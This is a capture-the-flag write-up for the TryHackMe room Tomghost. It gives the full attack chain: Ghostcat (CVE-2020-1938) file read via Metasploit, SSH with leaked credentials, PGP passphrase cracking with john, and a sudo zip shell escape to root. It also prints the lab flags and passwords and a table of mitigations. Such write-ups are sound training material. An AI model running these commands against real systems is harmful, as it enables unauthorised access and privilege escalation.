# CTF Write-Up: [Tomghost](https://tryhackme.com/room/tomghost)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`THM{GhostCat_1s_so_cr4sy}`

</details>

<details>
<summary>Root Flag</summary>

`THM{Z1P_1S_FAKE}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

### Detailed Nmap Scan

```bash
nmap -vv -oN Nmap/Detailed -p 22,53,8009,8080 -A <IP_ADDRESS>
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 7.2p2 | Ubuntu 4ubuntu2.8 |
| 53 | DNS | tcpwrapped | — |
| 8009 | AJP | Apache Jserv Protocol v1.3 | ⚠️ AJP connector exposed publicly |
| 8080 | HTTP | Apache Tomcat 9.0.30 | Default Tomcat install — no customisation |

Port 8080 served the default Apache Tomcat landing page — no custom application deployed. The `/manager/` endpoint returned HTTP 403, accessible only from localhost. More interesting was port 8009: the **Apache JServ Protocol (AJP)** connector, which is meant for internal communication between a web server and Tomcat, was exposed directly to the internet.

Tomcat 9.0.30 combined with an exposed AJP port immediately pointed to **CVE-2020-1938 (Ghostcat)** — a critical file read/inclusion vulnerability in the AJP connector that was disclosed in February 2020.

---

## 2. Initial Access — Ghostcat (CVE-2020-1938)

Ghostcat allows an unauthenticated attacker to read any file from the Tomcat web application root via the AJP connector, including sensitive configuration files such as `WEB-INF/web.xml` and `WEB-INF/tomcat-users.xml`.

The Metasploit module `auxiliary/admin/http/tomcat_ghostcat` was used to exploit the vulnerability:

```
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <IP_ADDRESS>
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```

The `tomcat-users.xml` returned a 500 error (no default users configured), but `web.xml` contained credentials embedded in the application description field:

```xml
<display-name>Welcome to Tomcat</display-name>
<description>
   Welcome to GhostCat
      skyfuck:8730281lkjlkjdqlksalks
</description>
```

SSH login was attempted immediately with the leaked credentials:

```bash
ssh skyfuck@<IP_ADDRESS>
# Password: 8730281lkjlkjdqlksalks
```

✅ Shell as `skyfuck`.

---

## 3. Credential Discovery — PGP Decryption

The home directory contained two files of interest:

```bash
ls -la ~
```

```
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```

`credential.pgp` was a PGP-encrypted file. `tryhackme.asc` was the corresponding ASCII-armoured private key. The key was protected with a passphrase which needed cracking.

Both files were transferred to the attacking machine:

```bash
# On attacking machine
scp skyfuck@<IP_ADDRESS>:~/tryhackme.asc .
# Password: 8730281lkjlkjdqlksalks

scp skyfuck@<IP_ADDRESS>:~/credential.pgp .
# Password: 8730281lkjlkjdqlksalks
```

### Step 1: Extract the Hash

`gpg2john` was used to convert the PGP private key into a format John the Ripper can process:

```bash
gpg2john tryhackme.asc > hash.txt
```

### Step 2: Crack the Passphrase

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
alexandru        (tryhackme)
```

Passphrase cracked: **`alexandru`**

### Step 3: Decrypt the Credential File

```bash
gpg --import tryhackme.asc
# Enter passphrase: alexandru

gpg --decrypt credential.pgp
# Enter passphrase: alexandru
```

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

✅ Credentials for the second local user `merlin` obtained.

---

## 4. User Flag

```bash
ssh merlin@<IP_ADDRESS>
# Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

> 🚩 `THM{GhostCat_1s_so_cr4sy}`

---

## 5. Privilege Escalation — sudo zip (GTFOBins)

Checking sudo privileges for `merlin`:

```bash
sudo -l
```

```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

`merlin` could run `zip` as root without a password. GTFOBins documents a shell escape for `zip` using the `-T` and `-TT` flags, which allow execution of an arbitrary command as the unzip test program:

🔗 [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#shell)

```bash
sudo zip /tmp/pwn.zip /etc/hosts -T -TT 'sh #'
```

The `-T` flag triggers an integrity test after compression, and `-TT` specifies the command to use as the test program. Passing `sh #` causes `zip` to spawn a shell — the `#` comments out any trailing arguments zip appends, preventing the command from failing.

```bash
merlin@ubuntu:~$ sudo zip /tmp/pwn.zip /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
```

✅ Root shell obtained.

---

## 6. Root Flag

```bash
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```

> 🚩 `THM{Z1P_1S_FAKE}`

---

## 7. Attack Chain

```
Nmap Scan
    └─► Port 8009 (AJP) + Tomcat 9.0.30 → CVE-2020-1938 (Ghostcat)

Ghostcat LFI via AJP connector
    └─► /WEB-INF/web.xml → skyfuck:8730281lkjlkjdqlksalks

SSH as skyfuck
    └─► credential.pgp + tryhackme.asc discovered

gpg2john + john (rockyou.txt)
    └─► PGP passphrase cracked: alexandru

GPG decrypt credential.pgp
    └─► merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

SSH as merlin → user.txt

sudo -l → NOPASSWD: /usr/bin/zip
    └─► GTFOBins zip shell escape → root

cat /root/root.txt → root flag
```

---

## 8. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | CVE-2020-1938 (Ghostcat) — AJP connector exposed publicly | Unauthenticated file read from web application root | Disable AJP connector if unused; bind to loopback only if required; upgrade Tomcat to a patched version |
| 2 | Credentials stored in plaintext inside `web.xml` description field | Application credentials leaked via Ghostcat LFI | Never store credentials in application configuration files; use environment variables or a secrets manager |
| 3 | PGP-encrypted credential file left in world-readable home directory | Credentials recoverable once key passphrase is cracked | Avoid storing encrypted credentials on disk; use a dedicated secrets vault |
| 4 | Weak PGP key passphrase (`alexandru`) | Passphrase cracked in under a second against rockyou.txt | Enforce strong, unique passphrases for cryptographic keys |
| 5 | `sudo NOPASSWD: /usr/bin/zip` granted to unprivileged user | Trivial privilege escalation to root via GTFOBins | Audit sudo rules; avoid granting sudo to binaries with known shell escapes |

---

*Tomghost — TryHackMe | Rooted ✅*
